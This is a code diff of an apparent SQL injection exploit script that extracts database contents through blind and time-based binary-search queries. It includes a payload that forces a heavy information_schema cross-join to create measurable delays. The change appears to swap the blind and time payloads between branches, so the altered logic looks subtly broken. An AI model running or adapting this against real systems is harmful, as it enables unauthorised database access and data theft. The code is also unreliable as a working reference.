@@ -52,18 +52,17 @@ def error_httpreq(vuln_part):
     return response.split(delims)[1]
 
 
-def caller_blind_httpreq(mid, query):
-    tmp = httpreq(query + ">" + str(mid))
+def caller_blind_httpreq(query):
+    tmp = httpreq(query)
     if tmp.find('Nancy') > 0:
         return 1
     else:
         return 0
 
 
-def caller_time_httpreq(mid, query):
-    vuln_param = "' and case when " + query + ">" + str(mid) + " then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end%23"
+def caller_time_httpreq(query):
     b_time = time.time()
-    tmp = httpreq(vuln_param)
+    tmp = httpreq(query)
     a_time = time.time()
     #print"time(after)-time(before): " + str(a_time - b_time)
     if (a_time - b_time) < 0.3:
@@ -81,9 +80,11 @@ def binary_httpreq(min, max, query):
     # print query + ">" + str(mid)
 
     if caller == "blind":
-        cnt = caller_blind_httpreq(mid, query)
+        query = "' and case when " + query + ">" + str(mid) + " then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end%23"
+        cnt = caller_blind_httpreq(query)
     else:
-        cnt = caller_time_httpreq(mid, query)
+        query = query + ">" + str(mid)
+        cnt = caller_time_httpreq(query)
 
     if (max - min) <= 1:
         if cnt:
